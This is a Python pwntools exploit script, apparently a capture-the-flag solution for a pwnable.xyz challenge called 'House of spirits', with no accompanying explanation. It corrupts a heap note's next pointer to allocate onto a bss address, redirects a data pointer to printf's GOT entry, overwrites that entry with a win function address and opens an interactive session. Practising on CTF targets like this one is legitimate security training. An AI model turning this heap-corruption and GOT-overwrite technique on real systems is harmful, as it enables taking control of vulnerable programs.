###House of spirits

from pwn import *

###Structure
'''
note(0x50)
    |   4   |   4   |   4   |   4   |
0x00|             title             |
0x10|    data_ptr   |     remark    |
0x20|             remark            |
0x30|             remark            |
0x40| index |       |    next_ptr   |
'''

###Util
def create(cnt):
    r.sendlineafter('> ','1')
    r.sendlineafter('create: ',str(cnt))

def choose(idx):
    r.sendlineafter('> ','2')
    r.sendlineafter('select: ',str(idx))

def edit(idx,data):
    choose(idx)
    r.sendlineafter('> ','3')
    r.sendlineafter('note ',data)

def delete(idx):
    choose(idx)
    r.sendlineafter('> ','4')

def leave():
    r.sendlineafter('> ','5')

###Addr
printf_got = 0x602038
current_note = 0x6022a0
first_note = 0x6022c0
win = 0x400dd9

###Exploit
r = remote('svc.pwnable.xyz',30046)

###Pad note count to >0x71
create(0x71)
delete(0x71)

###Set current note to 0x71 and malloc onto it
edit(0x71,p64(current_note-8))
create(2)

###Hijack data_ptr of first_note(in bss)
edit(0x72,p64(0)*5+p64(printf_got))
edit(0,p64(win))

r.interactive()
